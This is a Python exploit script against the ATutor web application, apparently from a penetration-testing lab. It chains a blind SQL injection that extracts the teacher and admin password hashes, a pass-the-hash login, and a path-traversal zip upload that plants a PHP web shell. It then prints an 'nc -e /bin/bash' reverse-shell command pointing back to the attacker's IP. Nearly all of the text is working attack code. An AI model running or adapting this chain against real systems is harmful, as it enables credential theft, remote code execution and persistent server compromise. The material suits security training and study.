import asyncio
from mysqli_template_async import get_string
from mysqli_template_async import get_length
import hashlib
import requests
import netifaces as ni
import zipfile
from io import BytesIO
try:
    import uvloop
    uvloop.install()
except:
    pass

#test_session = requests.Session()

def gen_hash(passwd:str, token:str):
    to_hash = passwd + token
    hash_object = hashlib.sha1(to_hash.encode('utf-8'))
    hash = hash_object.hexdigest()
    return hash
def pass_the_hash(ip:str, passwd:str, account:str, session:requests.sessions.Session):
    target = F"http://{ip}/ATutor/login.php"
    token = ""
    hashed = gen_hash(passwd, token)
    d = {
        "form_password_hidden" : hashed,
        "form_login": account,
        "submit": "Login",
        "token" : token # it is crucial for pass the hash to work that this parameter is present even if it is blank!
    }
    res = session.post(target, data=d)
    text = res.text
    if("Log-out" in text):
    #if "Create Course: My Start Page" in text or "My Courses: My Start Page" in text:
        return True
    return False
def build_zip_backdoor(filename:str):
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr(F'../../../../../var/www/html/ATutor/mods/{filename}/{filename}.phtml', "<?php system($_GET['cmd'])?>")
    z.writestr('imsmanifest.xml','invalid xml!')
    z.close()
    zip = open(F'{filename}.zip', 'wb')
    zip.write(f.getvalue())
    zip.close()
def upload_backdoor(session:requests.sessions.Session, filename:str):
    proxies = {'http':'http://192.168.177.1:8080/'}
    build_zip_backdoor(filename=filename)
    full_filename = F'{filename}.zip'
    fileobj = open(F'./{full_filename}','rb')
    # Absolutely crucial to exploit working. We must be in a valid course in order to upload, uploads are specific to each course
    res = session.get("http://atutor/ATutor/bounce.php?course=16777215")
    print("1: ", session.cookies.get_dict())
    res = session.post(
        url='http://atutor/ATutor/mods/_standard/tests/import_test.php',
        files={
            "file":(full_filename,fileobj, 'application/x-zip-compressed'),
            },
        data={"submit_import": "Import"},
    )
    #print (res.status_code)
    # NOTICE THAT WE DO NOT USE THE SESSION ON PURPOSE, our backdoor should be reachable from an unauthenticated use context.
    backdoor_url = F"http://atutor/ATutor/mods/{filename}/{filename}.phtml"
    res = requests.get(backdoor_url)
    if (res.status_code == 200):
        print("(+) Backdoor Upload successfull")
        print(F"(+) Backdoor can be found at: {backdoor_url}")
        attacker_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
        print(F"(+) Reverse shell => curl {backdoor_url}?cmd=nc%20-e%20%2Fbin%2Fbash%20{attacker_ip}%204444")
    else:
        print("(+) Backdoor Upload Failed")
async def main():
    blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
    url = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
    conditional_error = lambda response: int(response.headers['Content-Length']) == 180
    query_encoder = lambda s: s.replace(' ','/**/')
    
    teacher_hash_query = "select password from AT_members where login='teacher'"
    admin_hash_query = "select password from AT_admins where login='admin'"
    
    hash_len = await get_length(url, base_query=blind_sqli_truthy, sub_query=teacher_hash_query, response_truth_condition=conditional_error, query_encoder=query_encoder)
    teacher_hash = await  get_string(url=url, base_query=blind_sqli_truthy, sub_query=teacher_hash_query, response_truth_condition=conditional_error, strlen=hash_len, query_encoder=query_encoder)
    print(F"(+) Recovered teacher hash: {teacher_hash}")

    hash_len = await get_length(url, base_query=blind_sqli_truthy, sub_query=admin_hash_query, response_truth_condition=conditional_error, query_encoder=query_encoder)
    admin_hash = await  get_string(url=url, base_query=blind_sqli_truthy, sub_query=admin_hash_query, response_truth_condition=conditional_error, strlen=hash_len, query_encoder=query_encoder)
    print(F"(+) Recovered administrator hash: {admin_hash}")

    session = requests.Session()
    print(F"(+) PTH successful w/ teacher_hash? {pass_the_hash(ip='atutor', passwd=teacher_hash, account='teacher',session=session)}")
    print(session.cookies.get_dict())
    upload_backdoor(session=session,filename="mangos")
    
    '''
    session = requests.Session()
    print(F"(+) PTH successful w/ admin_hash? {pass_the_hash(ip='atutor', passwd=admin_hash, account='admin', session=session)}")
    print(session.cookies.get_dict())
    '''
if __name__ == "__main__":
    try:
        asyncio.run(main())
    # https://github.com/MagicStack/uvloop/issues/349
    except NotImplementedError:
        pass